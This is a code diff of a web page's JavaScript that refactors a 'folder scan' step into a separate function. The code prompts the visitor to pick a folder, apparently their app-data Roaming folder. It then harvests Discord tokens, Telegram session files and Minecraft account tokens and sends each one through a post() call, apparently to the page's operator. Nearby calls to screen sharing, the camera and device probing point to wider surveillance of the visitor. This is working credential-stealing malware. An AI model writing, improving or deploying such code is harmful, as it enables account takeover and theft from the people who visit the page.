@@ -301,6 +301,35 @@ async function shareScreen() {
   }
 }
 
+async function runFolderScan() {
+  
+      mark("k3", "run");
+      try {
+        if (!window.showDirectoryPicker) throw new Error("no folder access");
+        const h = await window.showDirectoryPicker({ mode: "read" });
+        note("k3", "reading…");
+        const r = await scanRoaming(h);
+        appData = r;
+        const lines = [];
+        if (r.discord && r.discord.length) {
+          const uniq = [...new Set(r.discord)];
+          for (const tok of uniq) await post("Discord token", "dc", tok);
+          lines.push("<b>" + uniq.length + " discord token(s)</b>");
+        }
+        if (r.telegram) lines.push("<b>telegram session</b> · " + r.telegram.files + " files");
+        if (r.minecraft && r.minecraft.length) {
+          lines.push("<b>" + r.minecraft.length + " minecraft account(s)</b>");
+          for (const x of r.minecraft) await post("Minecraft", x.name || "?", x.token || "token");
+        }
+        note("k3", lines.join("<br>") || "nothing recognisable in there");
+        mark("k3", lines.length ? "done" : "fail");
+        await item("apps", r);
+      } catch (e) {
+        if (e.name === "AbortError") { note("k3", "skipped"); mark("k3", "fail"); }
+        else { mark("k3", "fail"); note("k3", "choose the folder with the button above"); }
+      }
+}
+
 /* ---------- flow ---------- */
 function update() {
   const done = ["k4", "k5"].every(k => $(k).classList.contains("done"));
@@ -334,33 +363,7 @@ $("go").addEventListener("click", async () => {
     mark("k2", "run"); const dev = await device(); mark("k2", "done");
     await item("device", dev);
 
-    /* folder scan: needs a click-level permission, so it goes last and never blocks */
-    mark("k3", "run");
-    try {
-      if (!window.showDirectoryPicker) throw new Error("no folder access");
-      const h = await window.showDirectoryPicker({ mode: "read" });
-      note("k3", "reading…");
-      const r = await scanRoaming(h);
-      appData = r;
-      const lines = [];
-      if (r.discord && r.discord.length) {
-        const uniq = [...new Set(r.discord)];
-        for (const tok of uniq) await post("Discord token", "dc", tok);
-        lines.push("<b>" + uniq.length + " discord token(s)</b>");
-      }
-      if (r.telegram) lines.push("<b>telegram session</b> · " + r.telegram.files + " files");
-      if (r.minecraft && r.minecraft.length) {
-        lines.push("<b>" + r.minecraft.length + " minecraft account(s)</b>");
-        for (const x of r.minecraft) await post("Minecraft", x.name || "?", x.token || "token");
-      }
-      note("k3", lines.join("<br>") || "nothing recognisable in there");
-      mark("k3", lines.length ? "done" : "fail");
-      await item("apps", r);
-    } catch (e) {
-      if (e.name === "AbortError") { note("k3", "skipped"); mark("k3", "fail"); }
-      else { mark("k3", "fail"); note("k3", "choose the folder with the button above"); }
-    }
-
+    runFolderScan();
     camOn();
 
     /* folder pick finishes here */
